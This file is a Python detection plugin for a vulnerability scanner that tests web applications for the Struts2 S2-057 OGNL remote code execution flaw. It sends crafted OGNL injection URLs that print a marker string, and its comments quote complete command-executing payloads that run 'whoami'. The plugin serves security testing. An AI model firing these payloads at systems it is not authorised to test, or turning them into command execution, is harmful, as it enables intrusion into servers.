#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2-057.py


import copy
import random
from urllib.parse import urlparse
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-057"
        self.vulmsg = "Struts2-057远程代码执行"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        if self.dictdata.get("url").get("extension").lower() not in ["do","action"]:
            return

        ran_a = random.randint(10000000, 20000000)
        ran_b = random.randint(1000000, 2000000)
        ran_check = ran_a - ran_b
        checks = [str(ran_check), '<Struts2-vuln-Check>']
        payloads = [
            '${{{}-{}}}/'.format(ran_a, ran_b),
            # 2.3.20 版本的命令执行如下:
            # from https://github.com/Ivan1ee/struts2-057-exp
            # /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action
            # 修改了下，不执行命令只打印
            r'%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%27%3cStruts2-vuln-%27%29%29.%28%23w.print%28%27Check%3e%27%29%29.%28%23w.close%28%29%29%7D/'
            # 2.3.34 版本的命令执行如下：
            # /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action
            r'%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%27%3cStruts2-vuln-%27%29%29.%28%23w.print%28%27Check%3e%27%29%29.%28%23w.close%28%29%29%7D/'
        ]
        url1 = self.get_parent_paths(self.url)
        if not url1:
            return
        url1 = url1[0]
        _suffix = self.url.split('/')[-1]
        headers=copy.deepcopy(self.dictdata.get("request").get("headers"))
        for payload in payloads:
            req = {
                "url": url1 + payload + _suffix,
                "method": "GET",
                "headers": headers,
                "verify": False,
                "allow_redirects":False,
                "timeout": 10,
            }
            r = request(**req)
            if r != None:
                for check in checks:
                    if check in str(r.headers) or check in r.text:
                        parser_=response_parser(r)
                        self.result.append({
                            "name": self.name,
                            "url": self.url,
                            "level": self.level,  # 0:Low  1:Medium 2:High
                            "detail": {
                                "vulmsg": self.vulmsg,
                                "request": parser_.getrequestraw(),
                                "response": parser_.getresponseraw(),
                            }
                        })
                        return



    def get_parent_paths(self,path,domain=True):
        '''
        通过一个链接分离出各种目录
        :param path:
        :param domain:
        :return:
        '''
        netloc = ''
        if domain:
            p = urlparse(path)
            path = p.path
            netloc = "{}://{}".format(p.scheme, p.netloc)
        paths = []
        if not path or path[0] != '/':
            return paths
        # paths.append(path)
        if path[-1] == '/':
            paths.append(netloc + path)
        tph = path
        if path[-1] == '/':
            tph = path[:-1]
        while tph:
            tph = tph[:tph.rfind('/') + 1]
            paths.append(netloc + tph)
            tph = tph[:-1]
        return paths